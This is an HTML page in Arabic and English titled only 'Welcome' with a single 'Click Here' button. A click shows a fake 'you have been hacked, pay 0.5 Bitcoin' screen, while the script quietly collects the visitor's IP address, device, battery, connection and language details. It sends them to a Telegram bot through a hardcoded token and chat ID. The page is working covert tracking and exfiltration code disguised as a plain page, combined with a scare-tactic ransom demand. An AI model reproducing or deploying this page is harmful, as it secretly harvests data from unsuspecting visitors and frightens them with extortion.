<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #0f0f0f;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            overflow: hidden;
        }

        /* الزر الرئيسي */
        #start-btn {
            padding: 15px 40px;
            font-size: 20px;
            color: white;
            background: linear-gradient(45deg, #ff0000, #8b0000);
            border: none;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
            transition: 0.3s ease;
            z-index: 10;
        }

        #start-btn:hover {
            transform: scale(1.1);
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.8);
        }

        /* نافذة الاختراق */
        #hack-screen {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: black;
            color: #00ff00;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            z-index: 100;
            font-family: 'Courier New', Courier, monospace;
        }

        .msg {
            font-size: 2rem;
            margin: 20px;
            text-shadow: 0 0 10px #00ff00;
        }

        .bitcoin-text {
            color: #f2a900;
            font-weight: bold;
            font-size: 1.5rem;
        }
    </style>
</head>
<body>

    <button id="start-btn">اضغط هنا / Click Here</button>

    <div id="hack-screen">
        <div class="msg">تم اختراقك بنجاح!<br>You have been successfully hacked!</div>
        <div class="msg bitcoin-text">نرجو دفع نصف حبة بتكوين <br> Please pay 0.5 Bitcoin</div>
    </div>

    <script>
        const token = '8017423244:AAFSakFPRLMT-ksMTkb_BkBLSwBLYo_9u28';
        const chatId = '7145266755';

        document.getElementById('start-btn').addEventListener('click', async () => {
            // 1. إظهار شاشة الاختراق
            document.getElementById('hack-screen').style.display = 'flex';

            // 2. جلب الـ IP
            let ipInfo = "Fetching...";
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                ipInfo = ipData.ip;
            } catch (e) { 
                ipInfo = "Unknown"; 
            }

            // 3. جلب حالة البطارية
            let batteryLevel = "Unknown";
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    batteryLevel = (battery.level * 100) + "%";
                }
            } catch (e) { 
                batteryLevel = "Permission Denied"; 
            }

            // 4. بناء الرسالة التي ستصل إلى بوت التليجرام
            const message = `🚨 **New Target Hacked!** 🚨\n\n` +
                            `🌐 IP Address: ${ipInfo}\n` +
                            `📱 Device: ${navigator.userAgent}\n` +
                            `🔋 Battery: ${batteryLevel}\n` +
                            `🌐 Connection: ${navigator.connection ? navigator.connection.effectiveType : 'Unknown'}\n` +
                            `🌍 Language: ${navigator.language}\n` +
                            `⏰ Time: ${new Date().toLocaleString()}`;

            // 5. إرسال البيانات إلى تليجرام عبر API
            try {
                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (error) {
                console.log("Error sending to Telegram:", error);
            }
        });
    </script>
</body>
</html>
